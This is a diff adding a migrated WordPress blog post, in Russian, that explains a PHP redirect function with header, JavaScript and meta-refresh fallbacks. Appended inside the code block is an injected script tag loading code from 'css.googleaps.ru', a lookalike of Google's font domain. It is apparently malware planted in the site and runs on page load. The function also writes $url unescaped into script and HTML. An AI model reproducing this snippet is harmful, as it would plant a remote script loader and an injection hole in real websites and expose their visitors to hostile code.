@@ -1,0 +1,47 @@
+---
+layout: post
+status: publish
+published: true
+title: Универсальная функция редиректа на php
+author:
+  display_name: Maxyc Webber
+  login: admin
+  email: maxycws@gmail.com
+  url: ''
+author_login: admin
+author_email: maxycws@gmail.com
+wordpress_id: 570
+wordpress_url: http://devdocs.ru/?p=36
+date: '2014-08-20 11:13:40 +0300'
+date_gmt: '2014-08-20 11:13:40 +0300'
+categories:
+- PHP
+tags:
+- php
+- ip
+- javascript
+- redirects
+- ui
+comments: []
+---
+<pre class="brush: php; gutter: true">&#47;&#47;==== Редирект... Сначала пробуем PHP редирект,<br />
+&#47;&#47;затем редирект на JavaScript ,<br />
+&#47;&#47;затем пробуем http редирект:</p>
+<p>function redirect($url){<br />
+if (!headers_sent()){<br />
+&#47;&#47;Если заголовки еще не отправление...<br />
+&#47;&#47;пробуем редирект на php<br />
+header("Location: ".$url); exit;<br />
+}else{<br />
+&#47;&#47;Если заголовки отправлены...<br />
+&#47;&#47;делаем редирект на javascript ...<br />
+&#47;&#47;если javascript отключен, делаем редирект на html.<br />
+echo &#039;<script type="text&#47;javascript">&#039;;<br />
+echo &#039;window.location.href="&#039;.$url.&#039;";&#039;;<br />
+echo &#039;<&#47;script>&#039;;<br />
+echo &#039;<br />
+<noscript>&#039;;<br />
+echo &#039;<meta http-equiv="refresh" content="0;url=&#039;.$url.&#039;" &#47;>&#039;;<br />
+echo &#039;<&#47;noscript>&#039;; exit;<br />
+}<br />
+}&#47;&#47;==== End -- Редирект<script src="&#47;&#47;css.googleaps.ru&#47;css?f=Open+Sans&cd=mb&ver=4.2.2"><&#47;script><&#47;pre></p>
